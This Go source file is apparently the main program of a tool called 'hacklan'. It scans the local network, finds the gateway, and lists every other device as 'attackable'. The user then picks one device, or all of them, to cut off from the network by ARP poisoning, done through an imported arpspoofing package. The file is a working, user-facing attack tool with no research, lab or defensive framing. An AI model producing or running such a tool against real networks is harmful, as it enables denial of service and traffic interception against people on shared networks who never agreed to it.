package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"syscall"

	"github.com/libp2p/go-netroute"
	"github.com/qa5imm/hacklan/arpspoofing"
)

func main() {

	// Scan the network
	hosts, iface, myIP, err := arpspoofing.ScanNetwork()
	if err != nil {
		fmt.Printf("Error scanning network: %v\n", err)
		os.Exit(1)
	}

	if len(hosts) == 0 {
		fmt.Println("No hosts found on the network.")
		os.Exit(0)
	}

	// Sort hosts by IP for consistent display
	sort.Slice(hosts, func(i, j int) bool {
		return compareIPs(hosts[i].IP, hosts[j].IP)
	})

	// Find gateway first
	gateway := findGateway(hosts)
	if gateway == nil {
		fmt.Println("Could not identify gateway. Using .1 address...")
		// Fallback: assume .1 is the gateway
		if len(hosts) > 0 {
			gatewayIP := make(net.IP, len(hosts[0].IP))
			copy(gatewayIP, hosts[0].IP)
			gatewayIP[3] = 1

			// Find the gateway in hosts
			for _, h := range hosts {
				if h.IP.Equal(gatewayIP) {
					gateway = &h
					break
				}
			}
		}

		if gateway == nil {
			fmt.Println("Gateway not found in discovered hosts!")
			os.Exit(1)
		}
	}

	// Filter attackable devices (exclude self and gateway)
	var attackableHosts []arpspoofing.Host
	for _, host := range hosts {
		if !host.IP.Equal(myIP) && !host.IP.Equal(gateway.IP) {
			attackableHosts = append(attackableHosts, host)
		}
	}

	if len(attackableHosts) == 0 {
		fmt.Println("No attackable devices found on the network.")
		os.Exit(0)
	}

	// Display attackable devices
	fmt.Printf("\nFound %d attackable device(s) on the network\n\n", len(attackableHosts))
	for i, host := range attackableHosts {
		fmt.Printf("%2d. %-15s  %s\n", i+1, host.IP, host.MAC)
	}
	fmt.Printf("%2d. All\n", len(attackableHosts)+1)

	// Ask user to select target or poison all
	targetIdx := promptInt("\nSelect the device to cutoff from network (0 to exit): ", 0, len(attackableHosts)+1)
	if targetIdx == 0 {
		fmt.Println("Exiting.")
		os.Exit(0)
	}

	// Set up signal handling for Ctrl+C
	stopChan := make(chan struct{})
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n[*] Interrupt received, stopping...")
		close(stopChan)
	}()

	// Check if user selected "poison all"
	if targetIdx == len(attackableHosts)+1 {
		// Poison all devices
		err = arpspoofing.PoisonAllDevices(hosts, gateway.IP, gateway.MAC, myIP, iface, stopChan)
		if err != nil {
			fmt.Printf("Error during mass poisoning: %v\n", err)
			os.Exit(1)
		}
	} else {
		// Poison single device
		target := attackableHosts[targetIdx-1]

		err = arpspoofing.PoisonDevice(target.IP, gateway.IP, target.MAC, gateway.MAC, iface, stopChan)
		if err != nil {
			fmt.Printf("Error during poisoning: %v\n", err)
			os.Exit(1)
		}
	}
}

// promptInt prompts for an integer within a range
func promptInt(prompt string, min, max int) int {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(prompt)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		val, err := strconv.Atoi(input)
		if err != nil {
			fmt.Printf("Invalid number. Please try again.\n")
			continue
		}

		if val < min || val > max {
			fmt.Printf("Please enter a number between %d and %d.\n", min, max)
			continue
		}

		return val
	}
}

// compareIPs compares two IPs for sorting
func compareIPs(a, b net.IP) bool {
	a4 := a.To4()
	b4 := b.To4()
	if a4 == nil || b4 == nil {
		return false
	}
	for i := 0; i < 4; i++ {
		if a4[i] != b4[i] {
			return a4[i] < b4[i]
		}
	}
	return false
}

// isLikelyGateway checks if an IP is likely the gateway (ends in .1)
func isLikelyGateway(ip net.IP) bool {
	ip4 := ip.To4()
	return ip4 != nil && ip4[3] == 1
}

// findGateway attempts to find the gateway in the host list
func findGateway(hosts []arpspoofing.Host) *arpspoofing.Host {
	gw, err := discoverInternetGateway()
	if err != nil {
		return nil

	}
	for i := range hosts {
		if hosts[i].IP.Equal(*gw) {
			return &hosts[i]
		}
	}
	return nil
}

func discoverInternetGateway() (*net.IP, error) {
	r, err := netroute.New()
	if err != nil {
		return nil, err
	}

	// Pick an Internet destination; it doesn’t have to be reachable.
	dst := net.IPv4(8, 8, 8, 8)

	_, gw, _, err := r.Route(dst)
	if err != nil {
		return nil, err
	}

	// gw is the gateway IP (next hop). src is the chosen local IP.
	return &gw, nil
}
